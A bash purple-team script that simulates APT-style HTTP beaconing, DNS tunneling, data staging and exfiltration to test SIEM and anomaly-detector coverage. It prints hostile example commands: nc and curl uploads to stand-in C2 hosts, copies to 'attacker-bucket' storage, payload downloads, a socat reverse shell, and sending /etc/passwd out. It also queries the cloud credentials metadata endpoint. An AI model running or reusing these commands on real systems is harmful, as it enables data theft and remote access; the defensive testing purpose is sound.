#!/bin/bash
# =============================================================================
# APT Command & Control and Data Exfiltration Simulation
# Cloud SOC Platform - Purple Team Testing
# =============================================================================
#
# PURPOSE: Simulate C2 communication and exfil techniques used by APT29,
#          APT34, FIN7, and Lazarus Group to validate SIEM and anomaly
#          detection (beacon detector + DNS exfil detector).
#
# WARNING: FOR AUTHORIZED TESTING ONLY - Run only in controlled environments
#
# NOTE: This script makes outbound network requests to httpbin.org and
#       public DNS resolvers (8.8.8.8). Ensure this is acceptable.
#
# MITRE ATT&CK Coverage:
#   T1071.001 - Application Layer Protocol: Web (HTTP beaconing)
#   T1071.004 - Application Layer Protocol: DNS (DNS tunneling)
#   T1074.001 - Data Staged: Local Data Staging
#   T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
#   T1573.001 - Encrypted Channel: Symmetric Cryptography
#   T1567.002 - Exfiltration to Cloud Storage
#   T1105   - Ingress Tool Transfer
#
# =============================================================================

set -euo pipefail

# Source common library
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

# Config
WORKDIR=$(mktemp -d /tmp/soc-sim-c2-XXXXXX)
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$SCRIPT_DIR/logs/apt-c2-exfil_${TIMESTAMP}.log"
mkdir -p "$SCRIPT_DIR/logs"

# C2 simulation targets (safe public services)
C2_BEACON_URL="https://httpbin.org/post"
C2_CHECKIN_URL="https://httpbin.org/get"
DNS_RESOLVER="8.8.8.8"

cleanup() {
    log_info "Cleaning up simulation artifacts..."
    rm -rf "$WORKDIR"
    log_info "Cleanup complete."
}
register_cleanup cleanup

# =============================================================================
# TEST FUNCTIONS
# =============================================================================

# Test 1: HTTP Beaconing (APT29 - T1071.001)
# This is the key test for our anomaly detector's beacon detection
test_http_beaconing() {
    print_section "📡" "HTTP C2 Beaconing (T1071.001 — APT29)"

    log_info "[1/7] Simulating periodic HTTP beaconing to C2 server"

    echo -e "  ${YELLOW}▸${NC} Beaconing to ${C2_CHECKIN_URL} with ~30s intervals"
    echo -e "    APT29 Cozy Bear typically beacons every 1-5 minutes"
    echo -e "    Using shorter intervals (30s) for testing purposes"
    echo ""

    local beacon_count=6
    for i in $(seq 1 $beacon_count); do
        local jitter=$((RANDOM % 5))  # 0-4 seconds of jitter
        local ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        echo -ne "    Beacon ${i}/${beacon_count}..."
        curl -s --connect-timeout 5 --max-time 10 \
            -A "$ua" \
            -H "X-Request-ID: $(uuidgen 2>/dev/null || echo "req-${i}-${RANDOM}")" \
            "$C2_CHECKIN_URL?id=$(hostname)&seq=${i}" \
            -o /dev/null 2>/dev/null && \
            echo -e " ${GREEN}✓${NC} (+${jitter}s jitter)" || \
            echo -e " ${RED}✗${NC} (connection failed)"

        if [ "$i" -lt "$beacon_count" ]; then
            sleep $((30 + jitter))
        fi
    done

    log_info "HTTP beaconing complete: $beacon_count beacons sent"

    echo ""
    echo -e "  ${GREEN}Expected Detection:${NC}"
    echo -e "    → Anomaly detector: beacon_anomaly/periodic_beacon"
    echo -e "    → Low coefficient of variation in connection intervals"
    echo ""
}

# Test 2: DNS Tunneling (APT34 / OilRig - T1071.004)
# This triggers our anomaly detector's DNS exfil detection
test_dns_tunneling() {
    print_section "🌐" "DNS Tunneling (T1071.004 — APT34 / OilRig)"

    log_info "[2/7] Simulating DNS-based data exfiltration"

    echo -e "  ${YELLOW}▸${NC} Encoding data as high-entropy DNS subdomain labels"
    echo -e "    APT34 (OilRig) is known for DNS tunneling via DNSExfiltrator"
    echo ""

    # Create fake sensitive data to "exfiltrate"
    echo "SENSITIVE: api_key=sk-proj-abc123def456 user=admin role=superadmin" > "$WORKDIR/exfil_data.txt"

    # Encode and send as DNS queries (to a non-existent domain — safe)
    local exfil_domain="cdn-analytics.test.invalid"
    local query_count=0

    while IFS= read -r line; do
        # Base64 encode the data and split into DNS-safe labels
        local encoded
        encoded=$(echo -n "$line" | base64 | tr '+/' '-_' | tr -d '=')

        # Split into 63-char max labels (DNS label limit)
        local label_idx=0
        while [ -n "$encoded" ]; do
            local label="${encoded:0:50}"
            encoded="${encoded:50}"

            local query="${label}.${label_idx}.${exfil_domain}"
            echo -e "    ${YELLOW}dig${NC} ${query:0:60}..."

            # Query will NXDOMAIN since domain is invalid — that's intentional
            dig +short +time=1 +tries=1 "$query" @${DNS_RESOLVER} >/dev/null 2>&1 || true
            query_count=$((query_count + 1))
            label_idx=$((label_idx + 1))
        done
    done < "$WORKDIR/exfil_data.txt"

    # Also generate high-entropy random queries (simulates encrypted payload)
    echo -e "  ${YELLOW}▸${NC} Sending high-entropy payload queries"
    for i in $(seq 1 15); do
        local random_data
        random_data=$(head -c 40 /dev/urandom | base64 | tr '+/' '-_' | tr -d '=\n' | head -c 50)
        local query="${random_data}.${i}.${exfil_domain}"
        echo -e "    ${YELLOW}dig${NC} ${query:0:60}..."
        dig +short +time=1 +tries=1 "$query" @${DNS_RESOLVER} >/dev/null 2>&1 || true
        query_count=$((query_count + 1))
    done

    log_info "DNS tunneling complete: $query_count queries sent to $exfil_domain"

    echo ""
    echo -e "  ${GREEN}Expected Detection:${NC}"
    echo -e "    → Anomaly detector: dns_exfil_anomaly/high_entropy_dns"
    echo -e "    → Anomaly detector: dns_exfil_anomaly/long_dns_queries"
    echo -e "    → Anomaly detector: dns_exfil_anomaly/dns_volume_spike"
    echo ""
}

# Test 3: Data Staging (FIN7 - T1074.001)
test_data_staging() {
    print_section "📦" "Local Data Staging (T1074.001 — FIN7)"

    log_info "[3/7] Simulating local data staging for exfiltration"

    STAGE_DIR="$WORKDIR/staged"
    mkdir -p "$STAGE_DIR"

    # Stage 1: Create fake sensitive files
    echo -e "  ${YELLOW}▸${NC} Creating mock sensitive files"
    echo "employee_id,name,ssn,salary" > "$STAGE_DIR/employee_data.csv"
    for i in $(seq 1 50); do
        echo "EMP${i},User ${i},XXX-XX-${RANDOM},$(( RANDOM % 100000 + 50000 ))" >> "$STAGE_DIR/employee_data.csv"
    done

    echo '{"api_keys": ["sk-test-fake-key-123", "sk-test-fake-key-456"]}' > "$STAGE_DIR/api_keys.json"
    echo "DB_PASSWORD=FakeP@ssw0rd123" > "$STAGE_DIR/.env"

    echo -e "    Staged: employee_data.csv ($(wc -l < "$STAGE_DIR/employee_data.csv") records)"
    echo -e "    Staged: api_keys.json"
    echo -e "    Staged: .env"

    # Stage 2: Archive (FIN7 uses 7z and tar for staging)
    echo -e "  ${YELLOW}▸${NC} Creating exfil archive"
    tar czf "$WORKDIR/exfil_package.tar.gz" -C "$STAGE_DIR" . 2>/dev/null
    local archive_size
    archive_size=$(wc -c < "$WORKDIR/exfil_package.tar.gz" | tr -d ' ')
    echo -e "    Archive: exfil_package.tar.gz (${archive_size} bytes)"

    # Stage 3: Split for chunked exfiltration
    echo -e "  ${YELLOW}▸${NC} Splitting archive for chunked transfer"
    split -b 512 "$WORKDIR/exfil_package.tar.gz" "$WORKDIR/chunk_" 2>/dev/null || true
    local chunk_count
    chunk_count=$(ls "$WORKDIR"/chunk_* 2>/dev/null | wc -l | tr -d ' ')
    echo -e "    Split into ${chunk_count} chunks"
    log_info "Data staging complete: $chunk_count chunks ready"

    echo -e "  ${GREEN}Expected Alerts:${NC} Archive creation, sensitive directory access"
    echo ""
}

# Test 4: Base64 Exfil Over HTTP (APT29 - T1048.003)
test_base64_http_exfil() {
    print_section "📤" "Base64 HTTP Exfiltration (T1048.003 — APT29)"

    log_info "[4/7] Simulating encoded data exfiltration over HTTP"

    # Encode the staged data
    echo -e "  ${YELLOW}▸${NC} Base64 encoding staged data"
    local encoded_data
    encoded_data=$(base64 "$WORKDIR/exfil_package.tar.gz" 2>/dev/null | head -100)
    echo -e "    Encoded ${#encoded_data} characters"

    # Simulate chunked POST exfiltration
    echo -e "  ${YELLOW}▸${NC} POSTing encoded chunks to C2"
    local chunk_num=0
    echo "$encoded_data" | fold -w 500 | head -5 | while IFS= read -r chunk; do
        chunk_num=$((chunk_num + 1))
        echo -ne "    Chunk ${chunk_num}..."
        curl -s --connect-timeout 5 --max-time 10 \
            -X POST "$C2_BEACON_URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "data=${chunk}&host=$(hostname)&seq=${chunk_num}" \
            -o /dev/null 2>/dev/null && \
            echo -e " ${GREEN}✓${NC}" || \
            echo -e " ${RED}✗${NC}"
        sleep 2
    done
    log_info "HTTP exfiltration complete"

    echo -e "  ${GREEN}Expected Alerts:${NC} Base64 encoding (Rule 100101), HTTP upload (Rule 100100)"
    echo ""
}

# Test 5: Encrypted Exfiltration (Lazarus Group - T1573.001)
test_encrypted_exfil() {
    print_section "🔐" "Encrypted Exfiltration (T1573.001 — Lazarus)"

    log_info "[5/7] Simulating encrypted data packaging for exfil"

    # Create encrypted archive
    echo -e "  ${YELLOW}▸${NC} Encrypting staged data with AES-256-CBC"
    openssl enc -aes-256-cbc -salt -pbkdf2 \
        -in "$WORKDIR/exfil_package.tar.gz" \
        -out "$WORKDIR/exfil_encrypted.bin" \
        -pass pass:"SimulationKey123" 2>/dev/null || \
        echo -e "    openssl enc not available"

    if [ -f "$WORKDIR/exfil_encrypted.bin" ]; then
        local enc_size
        enc_size=$(wc -c < "$WORKDIR/exfil_encrypted.bin" | tr -d ' ')
        echo -e "    Encrypted package: ${enc_size} bytes"

        # Simulate exfil via netcat syntax (NOT executed)
        echo -e "  ${YELLOW}▸${NC} Exfil commands (logged, not executed):"
        echo -e "    nc -w 5 c2server.evil 4443 < exfil_encrypted.bin"
        echo -e "    curl -X PUT -d @exfil_encrypted.bin https://c2/upload"
    fi
    log_info "Encrypted exfil packaging complete"

    echo -e "  ${GREEN}Expected Alerts:${NC} openssl usage, large encrypted file creation"
    echo ""
}

# Test 6: Cloud Exfil Simulation (APT29 - T1567.002)
test_cloud_exfil() {
    print_section "☁️" "Cloud Storage Exfiltration (T1567.002 — APT29)"

    log_info "[6/7] Simulating exfiltration to cloud storage"

    # Check for cloud CLI tools (indicates cloud environment)
    echo -e "  ${YELLOW}▸${NC} Checking for cloud CLIs (exfil vectors)"
    for tool in aws gcloud az s3cmd rclone; do
        if command -v "$tool" &>/dev/null; then
            echo -e "    ${RED}Found:${NC} $tool ($(which $tool))"
        fi
    done

    # Simulate S3 exfil command construction (NOT executed)
    echo -e "  ${YELLOW}▸${NC} Constructed exfil commands (logged, NOT executed):"
    echo -e "    aws s3 cp exfil_package.tar.gz s3://attacker-bucket/"
    echo -e "    gsutil cp exfil_package.tar.gz gs://attacker-bucket/"
    echo -e "    az storage blob upload -f exfil_package.tar.gz -c data"
    echo -e "    rclone copy exfil_package.tar.gz remote:exfil/"

    # Check if instance has cloud storage access (metadata check)
    echo -e "  ${YELLOW}▸${NC} Checking for cloud storage IAM permissions"
    curl -s --connect-timeout 2 --max-time 3 \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || \
        echo -e "    Not running on AWS instance"
    log_info "Cloud exfil simulation complete"

    echo -e "  ${GREEN}Expected Alerts:${NC} Cloud CLI usage, IMDS access, Rule 100103"
    echo ""
}

# Test 7: LOLBin Transfer Agents (APT28 - T1105)
test_lolbin_transfer() {
    print_section "🔧" "LOLBin Transfer Agents (T1105 — APT28)"

    log_info "[7/7] Demonstrating LOLBin-based file transfers"

    echo -e "  ${YELLOW}▸${NC} Testing available LOLBin transfer tools:"
    echo ""

    # curl
    if command -v curl &>/dev/null; then
        echo -e "    ${RED}curl${NC} — HTTP/HTTPS transfers"
        echo -e "      Exfil: curl -X POST -d @/etc/passwd $C2_BEACON_URL"
        echo -e "      Download: curl -o /tmp/payload http://c2/payload"
    fi

    # wget
    if command -v wget &>/dev/null; then
        echo -e "    ${RED}wget${NC} — HTTP downloads"
        echo -e "      wget -q -O /tmp/payload http://c2/payload"
    fi

    # python
    for py in python3 python; do
        if command -v "$py" &>/dev/null; then
            echo -e "    ${RED}${py}${NC} — HTTP server / downloader"
            echo -e "      Exfil: $py -c \"import urllib.request; urllib.request.urlopen(url, data)\""
            echo -e "      Serve: $py -m http.server 8080  # host files for lateral movement"
            break
        fi
    done

    # openssl
    if command -v openssl &>/dev/null; then
        echo -e "    ${RED}openssl${NC} — Encrypted transfer"
        echo -e "      openssl s_client -connect c2:443 < /etc/passwd"
    fi

    # socat
    if command -v socat &>/dev/null; then
        echo -e "    ${RED}socat${NC} — Bidirectional relay"
        echo -e "      socat TCP:c2:4444 EXEC:/bin/sh"
    fi

    # netcat variants
    for nc in nc ncat netcat; do
        if command -v "$nc" &>/dev/null; then
            echo -e "    ${RED}${nc}${NC} — Raw TCP transfer"
            echo -e "      $nc -w 5 c2 4444 < /etc/passwd"
            break
        fi
    done

    log_info "LOLBin survey complete"

    echo ""
    echo -e "  ${GREEN}Expected Alerts:${NC} Network tool detection (Rule 100261)"
    echo ""
}

# =============================================================================
# REPORT
# =============================================================================

generate_report() {
    local report_file="$SCRIPT_DIR/logs/apt-c2-exfil_${TIMESTAMP}_report.md"
    cat > "$report_file" << EOF
# APT C2 & Data Exfiltration Simulation Report

**Date**: $(date '+%Y-%m-%d %H:%M:%S')
**Host**: $(hostname)
**User**: $(whoami)
**OS**: $(uname -srm)

## APT Groups Simulated
- **APT29** (Cozy Bear) — HTTP beaconing, base64 HTTP exfil, cloud exfil
- **APT34** (OilRig) — DNS tunneling
- **FIN7** — Data staging and archiving
- **Lazarus Group** — Encrypted exfiltration
- **APT28** (Fancy Bear) — LOLBin transfer agents

## Tests Executed

| # | Technique | MITRE | Status |
|---|-----------|-------|--------|
| 1 | HTTP C2 beaconing (periodic) | T1071.001 | ✅ |
| 2 | DNS tunneling (high-entropy queries) | T1071.004 | ✅ |
| 3 | Local data staging & archiving | T1074.001 | ✅ |
| 4 | Base64 exfil over HTTP POST | T1048.003 | ✅ |
| 5 | AES-256 encrypted packaging | T1573.001 | ✅ |
| 6 | Cloud storage exfil simulation | T1567.002 | ✅ |
| 7 | LOLBin transfer agent survey | T1105 | ✅ |

## Anomaly Detector Coverage
- HTTP beaconing → beacon_anomaly/periodic_beacon
- DNS tunneling → dns_exfil_anomaly/high_entropy_dns, long_dns_queries, dns_volume_spike

## Verification
Check Wazuh dashboard for Rules: 100100, 100101, 100102, 100103, 100261
Check anomaly detector for: beacon_anomaly, dns_exfil_anomaly categories
EOF
    echo -e "${GREEN}✓${NC} Report: $report_file"
}

# =============================================================================
# MAIN
# =============================================================================

main() {
    print_header "APT C2 & Data Exfiltration Simulation"

    safety_check "APT-style C2 communication and data exfiltration (includes outbound network requests)" "$@"

    echo ""
    log_info "Starting APT C2 & exfiltration simulation..."
    log_info "Artifacts staged in: $WORKDIR"
    log_info "Log file: $LOG_FILE"
    echo ""
    echo -e "  ${YELLOW}NOTE:${NC} This script makes outbound requests to:"
    echo -e "    • httpbin.org (HTTP beacon/exfil simulation)"
    echo -e "    • 8.8.8.8 (DNS tunneling queries to .invalid domain)"
    echo ""

    test_http_beaconing
    test_dns_tunneling
    test_data_staging
    test_base64_http_exfil
    test_encrypted_exfil
    test_cloud_exfil
    test_lolbin_transfer

    generate_report

    echo ""
    print_header "SIMULATION COMPLETE"
    log_info "All 7 C2 & exfiltration tests completed."
    log_info "Artifacts cleaned up on exit."
    echo ""
    echo "Next steps:"
    echo "  1. Check Wazuh dashboard for generated alerts"
    echo "  2. Run anomaly detector to verify beacon + DNS exfil detection"
    echo "  3. Review the report in logs/"
    echo ""
}

main "$@"
